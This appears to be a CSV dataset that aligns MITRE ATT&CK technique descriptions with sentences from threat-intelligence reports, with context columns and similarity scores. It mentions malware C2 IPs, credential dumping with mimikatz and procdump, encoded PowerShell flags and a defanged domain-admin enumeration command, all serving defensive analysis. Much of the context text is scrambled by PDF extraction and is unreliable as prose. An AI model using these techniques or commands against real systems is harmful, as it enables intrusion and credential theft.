"to disguise the source of malicious traffic, adversaries may chain together multiple proxies.","adversaries may obtain and abuse credentials of existing valid accounts t1078 accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion. adversaries may enumerate files and directories or may search in file and directory t1083 specific locations of a host or network share for certain discovery information within a file system.","to disguise the source of malicious traffic, adversaries may chain multi-hop proxy t1090.003 together multiple proxies.",adversaries may use an osi non-application layer protocol for non-application layer t1095 communication between host and c2 server or among infected protocol hosts within a network. adversaries may create multiple stages for command and control multi-stage channels t1104 that are employed under different conditions or for certain functions.,66f55ee03063d294857001f7,4497,0.7392795414703097
adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for collection and to identify potential systems of interest for lateral movement.,adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect. adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis. exploit public-facing adversaries may attempt to exploit a weakness in an internet- t1190 application facing host or system to initially access a network.,66f55ee03063d294857001f7,4505,0.9143507482309509
adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,66f55ee03063d294857001f7,4503,0.8269319992049962
adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.,"once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data. adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.",adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement. deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis.,66f55ee03063d294857001f7,4504,0.881978330446374
"adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.","page 43 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may attempt to dump credentials to obtain account os credential dumping t1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. adversaries may use rootkits to hide the presence of programs, rootkit t1014 files, network connections, services, drivers, and other system components.","adversaries may attempt to make an executable or file difficult to obfuscated files or t1027 discover or analyze by encrypting, encoding, or otherwise information obfuscating its contents on the system or in transit.",adversaries may perform software packing or virtual machine software packing t1027.002 software protection to conceal their code. adversaries may attempt to manipulate features of their artifacts masquerading t1036 to make them appear legitimate or benign to users and/or security tools.,66f55ee03063d294857001f7,4482,0.9299575614174911
"adversaries may upload, install, or otherwise set up capabilities that can be used during targeting.",adversaries may develop malware and malware components that malware t1587.001 can be used during targeting. page 46 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may buy and/or steal capabilities that can be used obtain capabilities t1588 during targeting.,"adversaries may upload, install, or otherwise set up capabilities stage capabilities t1608 that can be used during targeting.",adversaries may deploy a container into an environment to deploy container t1610 facilitate execution or evade defenses. volatility plugin the following plugin for the volatility memory analysis framework will scan all processes on the system until it finds the snake user mode component injected into a process.,66f55ee03063d294857001f7,4524,0.8471943955017682
adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.,"adversaries may interact with the windows registry to hide configuration information within registry keys, remove modify registry t1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution. once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data.",adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.,adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect. adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement.,66f55ee03063d294857001f7,4503,0.8629106404467736
adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.,"once established within a system or network, an adversary may automated collection t1119 use automated techniques for collecting internal data. adversaries may encode data to make the content of command data encoding t1132 and control traffic more difficult to detect.",adversaries may encode data with a non-standard data encoding non-standard encoding t1132.002 system to make the content of command and control traffic more difficult to detect.,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to network share discovery t1135 gather as a precursor for collection and to identify potential systems of interest for lateral movement. deobfuscate/decode files adversaries may use obfuscated files or information to hide t1140 or information artifacts of an intrusion from analysis.,66f55ee03063d294857001f7,4504,0.798827857962277
this may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.,scheduled task). t1205 port knocking port knocking is a well-established method used by both defenders and adversaries to hide open ports from access.,"to enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.","usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.",66f55ed73063d294857001f6,3940,0.7014716099846838
"usually this series of packets consists of attempted connections to a predefined sequence of closed ports  port knocking, but can involve unusual flags, specific strings, or other unique characteristics.","t1205 port knocking port knocking is a well-established method used by both defenders and adversaries to hide open ports from access. to enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.","usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.","after the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. t1105 remote file files may be copied from one system to another to stage adversary copy tools or other files over the course of an operation.",66f55ed73063d294857001f6,3941,0.9495144920920063
adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may log user keystrokes to intercept credentials as keylogging t1056.001 the user types them. adversaries may abuse powershell commands and scripts for powershell t1059.001 execution.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4490,0.7783457342339757
adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may abuse powershell commands and scripts for powershell t1059.001 execution. adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic.,66f55ee03063d294857001f7,4491,0.8941816533246079
adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using osi application layer application layer protocol t1071 protocols to avoid detection/network filtering by blending in with existing traffic. adversaries may communicate using application layer protocols web protocols t1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using application layer protocols mail protocols t1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.,adversaries may communicate using the domain name system dns t1071.004 (dns) application layer protocol to avoid detection/network filtering by blending in with existing traffic. page 44 of 48 | product id: aa23-129a tlp:cleartlp:clear international partnership adversaries may stage collected data in a central location or data staged t1074 directory prior to exfiltration.,66f55ee03063d294857001f7,4492,0.7321792861267407
"the white company has checked for specific antivirus products on the target’s computer, including kaspersky, quick heal, avg, bitdefender, avira, sophos, avast!, and eset.",• clean up of the environment and the display of a decoy document to prevent the end- user from noticing anomalous behavior. • deletion of the original exploit file .,"• specific targeting and evasion of eight different antivirus products: • bitdefender, kaspersky, sophos, avast!, avg, avira, eset, quick heal.","• at different, specific times, the exploits stop evading different, specific antivirus products, eventually surrendering to all. we assess with high confidence that this is likely a diversionary tactic so the threat actor can attack a different area of the target network.",66f55f0b3063d294857001fb,540,0.7629215226245994
"the white company has checked for specific antivirus products on the target’s computer, including kaspersky, quick heal, avg, bitdefender, avira, sophos, avast!, and eset.","the first is that only one uses the jump_over_hook function, presumably because the other doesn’t care about evading the antivirus that requires the jump_over_hook function. the second difference concerns the number and brand of antivirus products that are bypassed.","in one variant, the antivirus products include kaspersky, bitdefender, sophos, avast!, avg, quick heal, avira, and eset; while in the other only avg and avast!",are bypassed. the third difference is in the dates during which the antivirus evasion occurs.,66f55f0b3063d294857001fb,826,0.7403030915512706
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","this code sets up the computer’s environment to load the actual malware. • malware (aka the payload), written in high-level, traditional programming languages (e.g.","c, c++, etc.).","in this case, the malware allowed targets to be spied upon and/or data to be stolen. • network and command and control (c2) infrastructure, i.e.",66f55f0b3063d294857001fb,81,0.747429411058619
a lazarus group malware sample adds persistence on the system by creating a shortcut in the user’s startup folder.,"the following table summarizes all the overlapping ttps between our findings and known techniques used by lazarus covered in previous research: ttp id – mitre att&ck name use t1071.001 application layer protocol: a lazarus group malware sample web protocols conducts c2 over http. 28 justice.gov/opa/press-release/file/1092091/download ____________________________________________________________________________________________________ www.clearskysec.com © all rights reserved to clearsky cyber security ltd. 2020 tlp: white – information is provided to the recipient only, and may not be distributed outside the initial exchange 37 | p ageoperation ‘dream job’ t1560.003 archive via custom method a lazarus group malware sample encrypts data using a simple byte based xor operation prior to exfiltration.",t1547.009 boot or logon autostart a lazarus group malware sample adds execution: registry run keys / persistence on the system by creating a startup folder shortcut in the user’s startup folder.,t1543.003 create or modify system several lazarus group malware process: windows service families install themselves as new services on victims. t1564.001 hide artifacts: hidden files a lazarus group vba macro sets its file and directories attributes to system and hidden t1055.001 process injection: dynamic- a lazarus group malware sample link library injection performs reflective dll injection.,66f560fe3063d29485700234,2693,0.7228681466466484
several lazarus group malware families install themselves as new services on victims.,"28 justice.gov/opa/press-release/file/1092091/download ____________________________________________________________________________________________________ www.clearskysec.com © all rights reserved to clearsky cyber security ltd. 2020 tlp: white – information is provided to the recipient only, and may not be distributed outside the initial exchange 37 | p ageoperation ‘dream job’ t1560.003 archive via custom method a lazarus group malware sample encrypts data using a simple byte based xor operation prior to exfiltration. t1547.009 boot or logon autostart a lazarus group malware sample adds execution: registry run keys / persistence on the system by creating a startup folder shortcut in the user’s startup folder.",t1543.003 create or modify system several lazarus group malware process: windows service families install themselves as new services on victims.,"t1564.001 hide artifacts: hidden files a lazarus group vba macro sets its file and directories attributes to system and hidden t1055.001 process injection: dynamic- a lazarus group malware sample link library injection performs reflective dll injection. target sectors during the past few years, lazarus has been actively attacking financial institutions such as cryptocurrency exchanges.",66f560fe3063d29485700234,2694,0.7275741554261166
"adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code.","when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.7254123622152466
adversaries may abuse the at.exe utility to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.7482680314881418
the de facto standard across cloud service providers is to host the instance metadata api at http://169.254.169.254.,"malicious c2 servers • communication: most communication was with the c2 servers of the kinsing malware (93.189.43.3, 91.215.169.111, 45.10.88.102, 195.3.146.118, 193.33.87.219), but this is not surprising since most attacks were related to the kinsing malware • ip addresses: we clustered the ip addresses based on their cidr ranges and found that the most frequent communication (top 20) was with aws ip addresses. most of the ip addresses pointed to s3 buckets, which may imply that attackers communicate with s3 buckets (cidr 52.216.0.0/15) • cloud metadata theft: we’ve also seen communication with internal ranges (192.168.0.0/24), which may indicate that attackers are seeking cloud metadata.","for instance, 169.254.169.254 is used in amazon ec2 metadata.","under the cloud shared responsibilty model, customers should ensure that access to ec2 metadata should follow the principle of least privilege access. by default, ec2 metadata has no permissions • mining pools: a dns lookup (for example, 35.163.175.186 and 185.10.68.220) is used to retrieve the ip address that is registered under the searched domain.",66f562193063d29485700252,4341,0.7405242340187144
"adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.","it remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike. see more > t1059.003 windows command shell 38.4% 1,984 organizations affected confirmed threats while it doesn’t do much on its own, windows command shell can call on virtually any executable on the system to execute batch files and arbitrary tasks.","see more > t1059: command and scripting “adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.","these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. most systems come with some built-in command-line interface and scripting capabilities, for example, macos and linux distributions include some flavor of unix shell while windows installations include the windows command shell and powershell.” 11 seuqinhcet-bus tnelaverp l 11 t1059: command and scripting interpreter2021 threat detection report technique t1059.001 powershell #1 powershell was the most common technique we observed in 2020, affecting parent technique rank nearly half of our customers.",66f561f73063d2948570024f,3057,0.8001322745669907
these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.,"see more > t1059.003 windows command shell 38.4% 1,984 organizations affected confirmed threats while it doesn’t do much on its own, windows command shell can call on virtually any executable on the system to execute batch files and arbitrary tasks. see more > t1059: command and scripting “adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.",these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.,"most systems come with some built-in command-line interface and scripting capabilities, for example, macos and linux distributions include some flavor of unix shell while windows installations include the windows command shell and powershell.” 11 seuqinhcet-bus tnelaverp l 11 t1059: command and scripting interpreter2021 threat detection report technique t1059.001 powershell #1 powershell was the most common technique we observed in 2020, affecting parent technique rank nearly half of our customers. it remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.",66f561f73063d2948570024f,3058,1.0
these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.,"this attack targets supply-chain processes and could be modified to target other hidden supply chain components, processes, or even the build artifacts themselves, which can pose a severe threat. execution scripting attackers abused command and script interpreters to execute malicious commands, scripts, or binaries.",these interfaces and languages provide ways of interacting with computer systems and are common across many platforms.,"attackers used the cmd or entry point to execute commands, scripts, or binaries. we’ve seen many attack forms, including: • executing shell or python scripts that are already on disk • using curl or wget unix commands to download scripts or binaries from a remote source • hiding in the cmd encoded binary, decoding it, writing it to file, and executing it local job scheduling after mounting the host (docker escape as described below as writable hostpath mount under persistence), and using the cron utility, the attacker can schedule a cron job on the host to schedule a malicious command execution.",66f562193063d29485700252,4388,0.9298621005939781
adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.,"l 32 t1218.005: mshta2021 threat detection report technique t1543 create or modify #3 system process overall rank create or modify system process ranks third this year thanks in large part to detections associated with its windows service sub-technique. 32.8% organizations affected t1059.001 windows service 4.9% 3,324 3,197 organizations affected confirmed threats typically, windows services automatically run with elevated confirmed threats privileges during the boot cycle of the operating system, granting adversaries a means of both persistence and privilege escalation.",see more > t1543: create or modify system process “adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.,"when operating systems boot up, they can start processes that perform background system functions. on windows and linux, these system processes are referred to as services.",66f561f73063d2948570024f,3267,0.8449395798721356
"when operating systems boot up, they can start processes that perform background system functions.","32.8% organizations affected t1059.001 windows service 4.9% 3,324 3,197 organizations affected confirmed threats typically, windows services automatically run with elevated confirmed threats privileges during the boot cycle of the operating system, granting adversaries a means of both persistence and privilege escalation. see more > t1543: create or modify system process “adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.","when operating systems boot up, they can start processes that perform background system functions.","on windows and linux, these system processes are referred to as services. on macos, launchd processes known as launch daemon and launch agent are run to finish system initialization and load user specific parameters.” 33 seuqinhcet-bus tnelaverp l 33 t1543: create or modify system process2021 threat detection report technique t1543.003 windows service #3 windows service made it into our top 10 thanks to a single threat: blue parent technique rank mockingbird, an activity cluster we identified that deploys monero cryptocurrency-mining payloads and leverages windows services for persistence.",66f561f73063d2948570024f,3268,1.0
"on windows and linux, these system processes are referred to as services.","see more > t1543: create or modify system process “adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. when operating systems boot up, they can start processes that perform background system functions.","on windows and linux, these system processes are referred to as services.","on macos, launchd processes known as launch daemon and launch agent are run to finish system initialization and load user specific parameters.” 33 seuqinhcet-bus tnelaverp l 33 t1543: create or modify system process2021 threat detection report technique t1543.003 windows service #3 windows service made it into our top 10 thanks to a single threat: blue parent technique rank mockingbird, an activity cluster we identified that deploys monero cryptocurrency-mining payloads and leverages windows services for persistence. 4.9% analysis organizations affected why do adversaries use windows service?",66f561f73063d2948570024f,3269,1.0
adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.7303010063180363
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.","the vulnerabilities typically run from the us-based private servers exploited were cve-2021-26855, cve-2021-26857, to exfiltrate data from an organization’s network. cve-2021-26858 a post-authentication arbitrary file write vulnerability in exchange.","cve-2021-26858, and cve-2021-27065.","microsoft assesses hafnium was associated with the initial activity with the 0-day exploits; however, cve-2021-27065 a post-authentication arbitrary file write vulnerability in exchange. the attacks included three steps.",66f561b03063d2948570024e,1886,0.7610550568854744
adversaries may use hidden users to mask the presence of user accounts they create or modify.,"this is a post-exploitation tool designed for network pivoting from a compromised unix box. it collects usernames, ssh keys, and known hosts from a unix system, and then it tries to connect via ssh to all the combinations found.",hidden users adversaries may use hidden users to mask the presence of user accounts that they create.,we’ve seen various examples of creating and hiding users in the victim’s environment. 2021 cloud native threat report 24team command and control proxy reverse proxy tools can create a secure tunnel to servers located behind firewalls or local machines that do not have a public ip.,66f562193063d29485700252,4444,0.8810448734760715
"-list /groups on macos, and groups on linux can list local groups.","that they have access to. in addition, the volume of network traffic plus the usual noise of constant web shells deep dive internet attacks means that targeted traffic aimed web shells remain popular with advanced at a web server can blend right in, making detection persistent threat (apt) actors of all types, including of web shells a lot more difficult and requiring nobelium17 and hafnium18 nation state activity advanced behavior-based detections.",groups.,"as dart and the microsoft 365 defender research team reported in both 202019 and 2021,20 in february 2020, we reported a steady increase web shell usage continues to climb among nation in the use of web shells in attacks worldwide. the state groups and criminal organizations.",66f561b03063d2948570024e,1504,0.757916433739184
adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.,"l 72 t1569.002: service execution2021 threat detection report technique t1036 masquerading #10 masquerading ranks tenth this year thanks in large part to detections associated overall rank with its rename system utilities sub-technique. 31.2% t1036.003 rename system utilities organizations affected 23.1% 624 organizations affected confirmed threats a behavior that’s inherently suspicious in the context of one 906 process can be completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off.",confirmed threats see more > t1036: masquerading “adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.,"masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. this may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.” 73 seuqinhcet-bus tnelaverp l 73 t1036: masquerading2021 threat detection report technique t1036.003 rename system utilities #10 a behavior that’s inherently suspicious in the context of one process can be parent technique rank completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off.",66f561f73063d2948570024f,3702,0.8178279612213413
"masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.","31.2% t1036.003 rename system utilities organizations affected 23.1% 624 organizations affected confirmed threats a behavior that’s inherently suspicious in the context of one 906 process can be completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off. confirmed threats see more > t1036: masquerading “adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.","masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.","this may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.” 73 seuqinhcet-bus tnelaverp l 73 t1036: masquerading2021 threat detection report technique t1036.003 rename system utilities #10 a behavior that’s inherently suspicious in the context of one process can be parent technique rank completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off. 23.1% analysis organizations affected why do adversaries use rename system utilities?",66f561f73063d2948570024f,3703,1.0000000000000002
"adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.","l 46 t1053.005: scheduled task2021 threat detection report technique t1003 os credential dumping #5 os credential dumping ranks fifth this year thanks almost entirely to detections overall rank associated with its lsass memory sub-technique. 19.1% t1003.001 lsass memory organizations affected 15.5% 1,447 organizations affected confirmed threats the local security authority subsystem service (lsass) is a boon 1,554 for adversaries looking to steal sensitive, often encrypted data, with a little help from administrative tools such as procdump and mimikatz.","confirmed threats see more > t1003: os credential dumping “adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.","credentials can then be used to perform lateral movement and access restricted information.” 47 seuqinhcet-bus tnelaverp l 47 t1003: os credential dumping2021 threat detection report technique t1003.001 lsass memory #5 the local security authority subsystem service (lsass) is a boon for parent technique rank adversaries looking to steal sensitive credentials, with a little help from administrative tools such as procdump. 15.5% analysis organizations affected why do adversaries use lsass memory?",66f561f73063d2948570024f,3400,0.8464144369798433
"rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them.","we continue to see this use of compromised websites to store malicious files such as scripts. obtain capabilities as written on mitre’s site, adversaries might buy or steal capabilities that can be used during targeting before compromising a victim.","rather than develop their capabilities in-house, adversaries can purchase, freely download, or steal them.","we have seen attackers using open-source tools, and specifically offensive security tools, to achieve their goals. initial access exploit public-facing application these attacks mostly exploit a blog misconfigured docker api port exposed threat alert: attackers building to the internet and allow all incoming malicious images directly on your host › traffic access.",66f562193063d29485700252,4373,0.8466270041890476
"adversaries can use powershell to perform a number of actions, including discovery of information and execution of code.","aliases, abbreviated cmdlets, argument names, and calling .net methods— powershell is a powerful interactive offers attackers many ways to invoke base64 and other encoding. below is a command-line interface and scripting case-agnostic review of the methods we commonly observe in rank order, with environment included in the windows approximate percentages representing their frequency of occurrence in our operating system.","adversaries can detections: use powershell to perform a number of actions, including discovery of • 27%: -e information and execution of code.","• 25%: -ec examples include the start-process • 21%: -encodecommand cmdlet which can be used to run an • 15%: [system.convert]::frombase64string() executable and the invoke-command • 6%: -encoded cmdlet which runs a command locally • 4%: -enc or on a remote computer (though • 1%: -en administrator permissions are required • .4%: -encod to use powershell to connect to • .01%: -enco remote systems).” • < .01%: -encodedco, -encodedc, -en^c given powershell’s support for shortened command-line arguments, escape characters in the command line, and more, do not consider the above list comprehensive. emerging windows command shell tradecraft while leveraging powershell, adversaries have been known to use format string obfuscation (i.e., the dynamic building of strings by using non-standard sequences of format string operators like {0} and {1}) instead of base64 encoding.",66f561f73063d2948570024f,3072,0.8798874932821235
security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.,"interestingly, this example shows “double masquerading”— system utilities to try to evade security both renaming the utility as well as choosing a name that mimics a different mechanisms concerning the usage of legitimate process. those utilities.",security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.,it may be possible to bypass c:\\\\windows\\\\system32\\\\cmd.exe /c csrss.exe -h those security mechanisms by renaming breached.contoso[. ]com -f (name=”domain admins”) the utility prior to utilization (ex: member -list | csrss.exe -h breached.contoso[.],66f561f73063d2948570024f,3720,1.0
"using rundll32.exe, vice executing directly  shared modules, may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations.","sometimes the execution of rundll32 by itself won’t be enough to determine malicious intent, and that’s when you can rely on process lineage to gain additional context. t1218.011: rundll32 detection suggestions “adversaries may abuse rundll32.exe some successful analytics for detecting malicious use of rundll32 include to proxy execution of malicious code.","the following: using rundll32.exe, vice executing directly (i.e., shared modules), may avoid triggering security tools that may execution from world-writable folders not monitor execution of the rundll32.","exe process because of allowlists or since adversaries will try to use rundll32 to load or write dlls from world or false positives from normal operations. user-writable folders, it makes sense to watch for rundll32.exe writing or loading rundll32.exe is commonly associated files to or from any of the following locations: with executing dll payloads.” • %appdata% • %public% • %programdata% • %temp% • %windir%\\\\system32\\\\microsoft\\\\crypto\\\\rsa\\\\machinekeys • %windir%\\\\system32\\\\tasks_migrated\\\\microsoft\\\\windows\\\\pla\\\\system • %windir%\\\\syswow64\\\\tasks\\\\microsoft\\\\windows\\\\pla\\\\system • %windir%\\\\debug\\\\wia • %windir%\\\\system32\\\\tasks • %windir%\\\\syswow64\\\\tasks • %windir%\\\\tasks • %windir%\\\\registration\\\\crmlog • %windir%\\\\system32\\\\com\\\\dmp • %windir%\\\\system32\\\\fxstmp • %windir%\\\\system32\\\\spool\\\\drivers\\\\color • %windir%\\\\system32\\\\spool\\\\printers • %windir%\\\\system32\\\\spool\\\\servers • %windir%\\\\syswow64\\\\com\\\\dmp • %windir%\\\\syswow64\\\\fxstmp • %windir%\\\\temp • %windir%\\\\tracing export functionalities you should also consider monitoring for instances of rundll32.exe running windows native dlls that have export functionalities that adversaries commonly l 24 t1218.001: rundll322021 threat detection report leverage for executing malicious code and evading defensive controls.",66f561f73063d2948570024f,3180,0.7181564970801156
adversaries may abuse the windows task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.9288052342487969
there are multiple ways to access the task scheduler in windows.,this is the second most common configuration we observed. task scheduler to perform task scheduling for initial or recurring execution of malicious code.,there are multiple ways to access the detection task scheduler in windows.,"the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel. in some cases, adversaries have used for windows systems, the microsoft-windows-task-scheduler/operational log a .net wrapper for the windows is a good source for monitoring the creation, modification, deletion, and use task scheduler, and alternatively, of scheduled tasks.",66f561f73063d2948570024f,3355,0.9603335907516127
"the schtasks can be run directly on the command line, or the task scheduler can be opened through the gui within the administrator tools section of the control panel.",task scheduler to perform task scheduling for initial or recurring execution of malicious code. there are multiple ways to access the detection task scheduler in windows.,"the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.","in some cases, adversaries have used for windows systems, the microsoft-windows-task-scheduler/operational log a .net wrapper for the windows is a good source for monitoring the creation, modification, deletion, and use task scheduler, and alternatively, of scheduled tasks. event ids 106 and 140 record when a new scheduled task is adversaries have used the windows created or updated, respectively, along with the name of the task.",66f561f73063d2948570024f,3356,0.8749788621091924
adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.,"l 38 t1543.003: windows service2021 threat detection report technique t1053 scheduled task/job #4 scheduled task/job ranks fourth this year thanks in large part to detections overall rank associated with its scheduled task sub-technique. 32.8% t1053.005 scheduled task organizations affected 27.6% 2,740 organizations affected confirmed threats 3,258 the primary task-scheduling component of windows, this technique allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party confirmed threats software.",see more > t1053: scheduled task/job “adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.,"utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. a task can also be scheduled on a remote system, provided the proper authentication is met (ex: rpc and file and printer sharing in windows environments).",66f561f73063d2948570024f,3321,0.818229363451153
